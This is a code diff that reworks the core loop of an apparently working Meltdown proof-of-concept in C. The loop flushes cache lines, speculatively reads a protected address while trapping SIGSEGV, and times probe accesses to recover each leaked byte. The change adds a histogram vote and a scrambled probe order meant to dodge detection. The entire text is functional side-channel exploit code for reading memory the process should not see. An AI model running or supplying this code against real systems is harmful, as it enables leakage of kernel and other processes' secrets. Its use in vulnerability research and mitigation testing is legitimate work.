@@ -236,38 +236,45 @@ static void sighandler(int signo) { siglongjmp(jmpenv, signo); }
 static void
 meltdown(void)
 {
-	uint64_t deltas[PROBE_NLINES];
+	unsigned int hist[PROBE_NLINES];
 	uint8_t line[16];
 	sig_t sigsegv;
-	uint64_t multhresh;
-	unsigned int i, r, v;
+	unsigned int i, r, v, xv;
 	int signo;
+	uint8_t b;
 
 	warnx("reading %zu bytes from %p with %u rounds",
 	    atk_len, atk_addr, atk_rounds);
-	multhresh = threshold * atk_rounds;
 	sigsegv = signal(SIGSEGV, sighandler);
 	for (i = 0; i < atk_len; ++i) {
-		memset(deltas, 0, sizeof deltas);
+		memset(hist, 0, sizeof hist);
+		/*
+		 * In each round, flush the cache, try to access the
+		 * target and record what we think its value is based on
+		 * which cache lines are hot after the speculative read.
+		 */
 		for (r = 0; r < atk_rounds; ++r) {
 			if ((signo = sigsetjmp(jmpenv, 1)) == 0) {
 				for (v = 0; v < PROBE_NLINES; ++v)
 					clflush(&probe[v * PROBE_LINELEN]);
 				spec_read(&atk_addr[i], probe, PROBE_SHIFT);
 			}
-			for (v = 0; v < PROBE_NLINES; ++v)
-				deltas[v] += timed_read(&probe[v * PROBE_LINELEN]);
-		}
-		line[i % 16] = 0;
-		for (v = 0; v < PROBE_NLINES; ++v) {
-			if (deltas[v] < multhresh) {
-				line[i % 16] = v;
-				break;
+			for (v = 0; v < PROBE_NLINES; ++v) {
+				xv = ((v * 167) + 13) % 256; /* dodge run detection */
+				if (timed_read(&probe[xv * PROBE_LINELEN]) < threshold)
+					hist[xv]++;
 			}
 		}
+		/* retain the most frequent value */
+		for (b = 0, v = 0; v < PROBE_NLINES; ++v)
+			if (hist[v] > hist[b])
+				b = v;
+		line[i % 16] = b;
+		/* output 16 bytes at a time */
 		if (i % 16 == 15)
 			hexdump(i - 15, line, 16);
 	}
+	/* output any leftovers */
 	if (i % 16 > 0)
 		hexdump(i - i % 16, line, i % 16);
 	signal(SIGSEGV, sigsegv);
